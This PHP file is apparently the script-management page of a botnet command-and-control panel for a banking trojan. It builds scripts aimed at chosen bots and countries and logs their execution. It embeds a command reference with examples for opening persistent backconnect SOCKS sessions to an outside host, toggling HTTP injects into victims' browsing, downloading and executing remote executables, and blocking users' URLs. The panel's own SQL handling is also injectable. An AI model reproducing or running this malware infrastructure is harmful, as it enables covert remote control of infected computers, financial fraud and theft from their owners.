<?php

define("TPL_TITLE", "Script");
define("REPORTS_LIMIT", 50);
define("PAGE_LIMIT", 10);
define("SCRIPT_DISABLE", 0);
define("SCRIPT_ENABLE", 1);

define("SORT_BOT_ID", 0);
define("SORT_STATE", 1);
define("SORT_TIME", 2);
define("SORT_REPORT", 3);

define("ASC", 0);
define("DESC", 1);

if (!isset($_GET["do"])) header("Location: " . DEFAULT_URI);
if (!CsrConnectToDb()) die();

if (isset($_POST["delete"])) 
{
	$sql = "delete from `scripts_stat` where ";
	foreach($_POST["delete"] as $id => $v) {
		$sql .= "`id` = " . $id . " or ";
	}
	$sql = substr($sql, 0, -4);
	CsrSqlQuery($sql);
}

$err_msg = '';
if (isset($_POST["save"])) 
{
	if (empty($_POST["name"]) || strlen($_POST["name"]) > 64) {
		$err_msg = "Bad name";
	}
	else if (!is_numeric($_POST["send_limit"])) {
		$err_msg = "Bad limit of sended";
	}
	else if (empty($_POST["content"]) || strlen($_POST["content"]) > 0xffff) {
		$err_msg = "Bad content";
	}
	else 
	{
		if ($_GET["do"] == "edit") 
		{
			if (!isset($_GET["id"]) || !is_numeric($_GET["id"])) header("Location: " . DEFAULT_URI);
			
			$sql = "update `scripts` set `name` = \"" . addslashes($_POST["name"]) . "\", 
											`flag_enabled` = " . intval($_POST["flag_enabled"]) . ",
											`send_limit` = " . intval($_POST["send_limit"]) . ",
											`bots` = \"" . CsrExpressionToSqlLists($_POST["bots"]) . "\", 
											`countries` = \"" . CsrExpressionToSqlLists($_POST["countries"]) . "\", 
											`content` = \"" . addslashes($_POST["content"]) . "\"
							where `id` = " . intval($_GET["id"]) . " limit 1";

			CsrSqlQuery($sql);
			header("Location: " . CORE_FILE . "?act=scripts");
		}
		else if ($_GET["do"] == "new") 
		{
			$extern_id = addslashes(md5(CURRENT_TIME . $_POST['content'], true));
			$sql = "insert into `scripts` (`extern_id`, `name`, `flag_enabled`, `time_created`, `send_limit`, `bots`, `countries`, `content`)
							values
							(\"" . $extern_id . "\", 
							 \"" . addslashes($_POST["name"]) . "\", 
								" . intval($_POST["flag_enabled"]) . ", 
								" . CURRENT_TIME . ", 
								" . intval($_POST["send_limit"]) . ",
								\"" . CsrExpressionToSqlLists($_POST["bots"]) . "\", 
								\"" . CsrExpressionToSqlLists($_POST["countries"]) . "\",  
								\"" . addslashes($_POST["content"]) . "\")";
								
			CsrSqlQuery($sql);	
			header("Location: " . CORE_FILE . "?act=scripts");
		}
		else {
			header("Location: " . DEFAULT_URI);
		}		
	}
}

if ($_GET["do"] == "edit") 
{
	if (!isset($_GET["id"])) header("Location: " . DEFAULT_URI);
	
	$script_id = intval($_GET["id"]);
	$script = CsrSqlQueryRow("select * from `scripts` where `id` = {$script_id} limit 1");
	if (!$script) header("Location: " . DEFAULT_URI);
	
	$extern_id = addslashes($script["extern_id"]);
	$count_reports = CsrSqlQueryRowEx("select count(*) from `scripts_stat` where `extern_id` = '{$extern_id}'");
	
	$begin = 0;
	if ($count_reports > 0) {
		$begin = CsrNavigationGetPage() * REPORTS_LIMIT - REPORTS_LIMIT;
	}
	
	$order_column = 'rtime';
	$t = 'desc';
	
	if (isset($_GET['sort'])) 
	{
		if ($_GET['sort'] == SORT_BOT_ID) $order_column = 'bot_id';
		else if ($_GET['sort'] == SORT_STATE) $order_column = 'type';
		else if ($_GET['sort'] == SORT_TIME) $order_column = 'rtime';
		else if ($_GET['sort'] == SORT_REPORT) $order_column = 'report';
		
		if ($_GET['t'] == ASC) $t = 'asc';
	}
	
	$reports = CsrSqlQueryRows("select * from `scripts_stat` where `extern_id` = '{$extern_id}' order by `{$order_column}` {$t} limit {$begin}, " . REPORTS_LIMIT . "");
}
else if ($_GET["do"] == "new") { }
else {
	header("Location: " . DEFAULT_URI);
}

if (isset($_GET['t']))
	$_SERVER["REQUEST_URI"] = substr($_SERVER["REQUEST_URI"], 0, -11);

ob_start();
?>

<form method="post"> 

<div class="row col-md-12">
	<table class="table table-striped table-bordered table-condensed table-hover">
		<tr>
			<td width="120px"> Name: </td> <td> <input class="form-control" type="text" name="name" value="<?=@$script["name"]?>"> </input> </td>
		</tr>
		<tr>
			<td> Status: </td> 
			<td> 
				<select name="flag_enabled">
					<? if (!isset($script)) { ?>
						<option value="1" selected> Enable </option>
						<option value="0"> Disable </option>
					<? } else { ?>
						<option value="<?=SCRIPT_DISABLE?>" <?=@$script["flag_enabled"] == SCRIPT_DISABLE ? "selected" : ""?>> Disable </option>
						<option value="<?=SCRIPT_ENABLE?>" <?=@$script["flag_enabled"] == SCRIPT_ENABLE ? "selected" : ""?>> Enable </option>
					<? } ?>
				</select>
			</td>
		</tr>
		<tr>
			<td> Limit of sended: </td> <td> <input class="form-control" type="text" name="send_limit" value="<?=@$script["send_limit"]?>"/></td>
		</tr>
		<tr>
			<td> List of bots: </td> <td> <input class="form-control" type="text" name="bots" value="<?=@CsrSqlListToExp($script["bots"])?>"/></td>
		</tr>
		<tr>
			<td> List of countries: </td> <td> <input class="form-control" type="text" name="countries" value="<?=@CsrSqlListToExp($script["countries"])?>"/></td>
		</tr>
		<tr>
			<td> Content: </td> <td> <textarea name="content" cols='90' rows='7'><?=@$script["content"]?></textarea> </td>
		</tr>
	</table>
</div>

<div class="row col-md-7">
	<button class="btn btn-info btn-sm" name='save'> Save </button> <?=$err_msg?>
</div>

</form>	

<?php
if (isset($reports) && is_array($reports) && count($reports) > 0) 
{
?>
<form method="post">
<div class="row col-md-12">
<br>
<table class="table table-striped table-bordered table-condensed table-hover">
	<tr>
		<th width="260px"> 
			<a href="<?=$_SERVER["REQUEST_URI"]?>&sort=<?=SORT_BOT_ID?>&t=<?=@((isset($_GET['t']) && isset($_GET['sort']) && $_GET['sort'] == SORT_BOT_ID) ? (int)!$_GET['t'] : ASC)?>">Bot ID </a>
		</th>
		
		<th width="100px">
			<a href="<?=$_SERVER["REQUEST_URI"]?>&sort=<?=SORT_STATE?>&t=<?=@((isset($_GET['t']) && isset($_GET['sort']) && $_GET['sort'] == SORT_STATE) ? (int)!$_GET['t'] : ASC)?>"> State </a>
		</th>
		
		<th width="150px">
			<a href="<?=$_SERVER["REQUEST_URI"]?>&sort=<?=SORT_TIME?>&t=<?=@((isset($_GET['t']) && isset($_GET['sort']) && $_GET['sort'] == SORT_TIME) ? (int)!$_GET['t'] : ASC)?>"> Time of report </a>
		</th>
		
		<th width="275px">
			<a href="<?=$_SERVER["REQUEST_URI"]?>&sort=<?=SORT_REPORT?>&t=<?=@((isset($_GET['t']) && isset($_GET['sort']) && $_GET['sort'] == SORT_REPORT) ? (int)!$_GET['t'] : ASC)?>">Report </a>
		</th>
		
		<th></th>
	</tr>
<?php
	foreach ($reports as &$report) 
	{
		if ($report["type"] == SCRIPT_SENDED) $report["script_state"] = "Sended";
		else if ($report["type"] == SCRIPT_EXECUTE) $report["script_state"] = "Execute";
		else if ($report["type"] == SCRIPT_ERROR) $report["script_state"] = "Error";
	?>
		<tr>
			<td><a href="<?CORE_FILE?>?act=bot&id=<?=$report["bot_id"]?>"><?=$report["bot_id"]?></a></td>
			<td><?=$report["script_state"]?></td>
			<td><?=date("d-m-Y H:i:s", $report["rtime"])?></td>
			<td><?=$report["report"]?></td>
			<td><input type='checkbox' name='delete[<?=$report["id"]?>]'/></td>
		</tr>
	<?
	}
?>
</table>
</div>

<div class="row col-md-12">
	<ul class="pagination pagination-sm"> <?=CsrNavigation(preg_replace("/&page=(\d+)/", "", $_SERVER["REQUEST_URI"]), $count_reports, REPORTS_LIMIT, PAGE_LIMIT)?> </ul>
		<button class="btn btn-info btn-sm pull-right"> Delete </button>
</div>

</form>

<? } ?>

<div class="row col-md-12"> &nbsp </div>

<style type="text/css">
  table.list, table.samples, table.parameters
  {
    border-collapse: collapse
  }
  table.list td, table.samples td, table.parameters td
  {
    padding:    1em;
    background: #EEEEEE;
    border:     1px solid #CCCCCC
  }
	
	ul {
		margin: -10px 0 0 -20px;
	}
</style>

<table class="table table-bordered table-condensed table-hover">
	<tr>
		<td>
	<br>
			<ul>
				 <li id="bot_bc_add"><p><b>bot_bc_add</b> [service] [backconnect_server] [backconnect_server_port]</p>
    <p>Adding a constant (the session will be restored even after restarting the computer) backconnect-session. This command is not available in all builds of the software.</i></p>
    <p><b>Parameters:</b></p>
    <table class="parameters">
      <tr>
        <td>service</td>
        <td>Port number or service name for which to create session.</td>
      </tr>
      <tr>
        <td>backconnect_server</td>
        <td>Host that is running backconnect-server.</td>
      </tr>
      <tr>
        <td>backconnect_server_port</td>
        <td>The port number on the host [backconnect_server].</td>
      </tr>
    </table>
		<br>
    <p><b>Examples:</b></p>
    <table class="samples">
      <tr>
        <td>bot_bc_add socks 192.168.100.1 4500</td>
        <td>You get access to Socks-server.</td>
      </tr>
    </table>
  </li>
	<br>
  <li id="bot_bc_remove"><p><b>bot_bc_remove</b> [service] [backconnect_server] [backconnect_server_port]</p>
    <p>Termination of the permanent backconnect-sessions. </p>
    <p><b>Parameters:</b></p>
    <table class="parameters">
      <tr>
        <td>service</td>
        <td>Port number or service name, for which the session is removed. Allows the use of masks (* and ? symbols), to remove the sessions group.</td>
      </tr>
      <tr>
        <td>backconnect_server</td>
        <td>Host, that is running backonnect-server. Allows the use of masks (* and ? symbols), to remove the sessions group.</td>
      </tr>
      <tr>
        <td>backconnect_server_port</td>
        <td>Port number on the host [backconnect_server]. Allows the use of masks (* and ? symbols), to remove the sessions group.</td>
      </tr>
    </table>
		<br>
    <p><b>Examples:</b></p>
    <table class="samples">
      <tr>
        <td>bot_bc_remove socks * *</td>
        <td>Deletes all sessions associated with the socks service.</td>
      </tr>
      <tr>
        <td>bot_bc_remove * * *</td>
        <td>Deletes all existing sessions.</td>
      </tr>
    </table>
  </li>
			<br>
				<li><p><b>bot_httpinject_disable</b> [url_1] [url_2] ... [url_X]</p>
					<p>Blocking execution of HTTP-injects to a specific URL for the current user. <u>Calling this command does not reset the current block list, but rather complements it.</u></p>
					<p><b>Parameters:</b></p>
					<table class="parameters">
						<tr>
							<td>url_1, ulr_2, ...</td>
							<td>URL's, in which you want to block execution of HTTP-injects. Allows the use of masks (* and # symbols).</td>
						</tr>
					</table>
					<br>
					<p><b>Examples:</b></p>
					<table class="samples">
						<tr>
							<td>bot_httpinject_disable http://www.google.com/*</td>
							<td>Blocks execution of HTTP-injects for http://www.google.com/.</td>
						</tr>
						<tr>
							<td>bot_httpinject_disable *</td>
							<td>Blocks execution of HTTP-injects for each URL.</td>
						</tr>
						<tr>
							<td>bot_httpinject_disable *.html *.gif</td>
							<td>Blocks execution of HTTP-injects for files with the html and gif.</td>
						</tr>
					</table>
				</li>
				<br>
				<li id="bot_httpinject_enable"><p><b>bot_httpinject_enable</b> [url_1] [url_2] ... [url_X]</p>
					<p>Unlock execution of HTTP-injects to a specific URL for the current user.</p>
					<p><b>Parameters:</b></p>
					<table class="parameters">
						<tr>
							<td>url_1, ulr_2, ...</td>
							<td>Masks (* and # symbols), on which from the list of blocked URL you want to remove the URL.</td>
						</tr>
					</table>
					<br>
					<p><b>Examples:</b></p>
					<table class="samples">
						<tr>
							<td>bot_httpinject_enable *.google.*</td>
							<td>Remove blocking execution of HTTP-injects in any URL from the block list, which contains in it ".google.".</td>
						</tr>
						<tr>
							<td>bot_httpinject_enable *</td>
							<td>Clear completely the list of block execution of HTTP-injects.</td>
						</tr>
						<tr>
							<td>bot_httpinject_enable *.html https://*</td>
							<td>Remove blocking execution of HTTP-injects with all html-files, and to all HTTPS-resources.</td>
						</tr>
					</table>
				</li>
<br>
				<li><p><b>user_execute</b> [path] [parameters]</p>
					<p>Start the process from the current user. Start process through ShellExecuteW(,NULL,,,,), if start failed, then the process is created through CreateProcessW.</p>
					<p><b>Parameters:</b></p>
					<table class="parameters">
						<tr>
							<td>path</td>
							<td>
								Local path or URL. Can be specified as an executable file (exe), as well as any other extension (doc, txt, bmp, etc.). For a successfull launch of a <u>not executable</u> file (not exe), that must be associated with some program.<br/><br/>
								If the parameter is a local path, then is usually the creation process. You may use "environment variables".<br/><br/>
								If the parameter is a URL, the URL gets downloaded to a file "%TEMP%\random_name\file_name", where random_name - arbitrary folder name, and file_name - resource name of the last part of URL-path (if the URL-path ends in a slash, then could throw an error). Currently is permitted to use only the HTTP and HTTPS protocols, also is recommended that URL-path is URL-encoded (true for non-English characters, the details are in RFC 1630 and 1738).
							</td>
						</tr>
						<tr>
							<td>parameters</td>
							<td>Arbitrary parameters passed to the process (not processed by the bot). Are not mandatory.</td>
						</tr>
					</table><br>
					<p><b>Examples:</b></p>
					<table class="samples">
						<tr>
							<td>user_execute http://www.google.com/dave/superdocumet.doc</td>
							<td>Download the file in "%TEMP%\random_name\superdocumet.doc", and execute it, for example via MS Word.</td>
						</tr>
						<tr>
							<td>user_execute http://www.google.com/dave/killer.exe /KILLALL /RESTART</td>
							<td>Download the file in "%TEMP%\random_name\killer.exe", and execute it with "/KILALL /RESTART" parameters.</td>
						</tr>
						<tr>
							<td>user_execute "%ProgramFiles%\Windows Media Player\wmplayer.exe"</td>
							<td>Launch media-player.</td>
						</tr>
						<tr>
							<td>user_execute "%ProgramFiles%\Windows Media Player\wmplayer.exe" "analporno.wmv"</td>
							<td>Launch a media-player with the parameter "analporno.wmv".</td>
						</tr>
					</table>
				</li>
<br>
				<li><p><b>user_url_block</b> [url_1] [url_2] ... [url_X]</p>
					<p>Block access to the URL for the current user. 
					<u>Calling this command does not reset the current block list, but rather complements it.</u><br/>
					<p><b>Parameters:</b></p>
					<table class="parameters">
						<tr>
							<td>url_1, ulr_2, ...</td>
							<td>URL's to which you want to block access. Allows the use of masks (* and # symbols).</td>
						</tr>
					</table><br>
					<p><b>Examples:</b></p>
					<table class="samples">
						<tr>
							<td>user_url_block http://www.google.com/*</td>
							<td>Block access to any URL on http://www.google.com/.</td>
						</tr>
						<tr>
							<td>user_url_block *</td>
							<td>Complete blocking of access to any resource.</td>
						</tr>
						<tr>
							<td>user_url_block http://*.ru/*.html https://*.ru/*</td>
							<td>Block access to any html-file in the zone ru, and blocking access to HTTPS-resources in the zone ru.</td>
						</tr>
					</table>
				</li>
<br>
				<li><p><b>user_url_unblock</b> [url_1] [url_2] ... [url_X]</p>
					<p>Unlock access to the URL in the famous libraries (browsers) for the current user.</p>
					<p><b>Parameters:</b></p>
					<table class="parameters">
						<tr>
							<td>url_1, ulr_2, ...</td>
							<td>Masks (* and # symbols), on which from the list of blocked URL you want to remove URL.</td>
						</tr>
					</table><br>
					<p><b>Examples:</b></p>
					<table class="samples">
						<tr>
							<td>user_url_unblock *.google.*</td>
							<td>Remove the lock on any URL from the block List, which contains ".google.".</td>
						</tr>
						<tr>
							<td>user_url_unblock *</td>
							<td>Clear the URL block list completely.</td>
						</tr>
						<tr>
							<td>user_url_unblock *.html https://*</td>
							<td>Remove the lock from all html-files, and blocks from all HTTPS-resources.</td>
						</tr>
					</table>
					</li>
					<br>
					<li><p><b>bot_uninstall</b></p>
					<p>Complete removal of the bot from the current user. This command will be executed after the execution of the script, regardless of position in the script.</p>
				</li>
			</ul>
		</td>
	</tr>
</table>
</div>


<?php
$content = ob_get_contents();
ob_end_clean();

$header_tpl = file_get_contents(TPL_PATH . "header.html");
$header_tpl = str_replace(array("{TPL}", "{SCRIPTS}", "{TITLE}"), array(TPL_PATH, "", TPL_TITLE), $header_tpl);

$menu_tpl = file_get_contents(TPL_PATH . "menu.html");
$menu_tpl = str_replace(array("{CORE_FILE}", "{CUR_TIME}", "{SCRIPTS_ACTIVE}"), array(CORE_FILE, gmdate("M d Y H:i:s", mktime()), "active"), $menu_tpl);

$body_tpl = file_get_contents(TPL_PATH . "body.html");
$body_tpl = str_replace(array("{MENU}", "{BODY_CLASS}", "{CONTENT}"), array($menu_tpl, "bots", $content), $body_tpl);
$footer_tpl = file_get_contents(TPL_PATH . "footer.html");

echo str_replace(array("{HEADER}", "{BODY}", "{FOOTER}"), array($header_tpl, $body_tpl, $footer_tpl), file_get_contents(TPL_PATH . "main.html"));
?>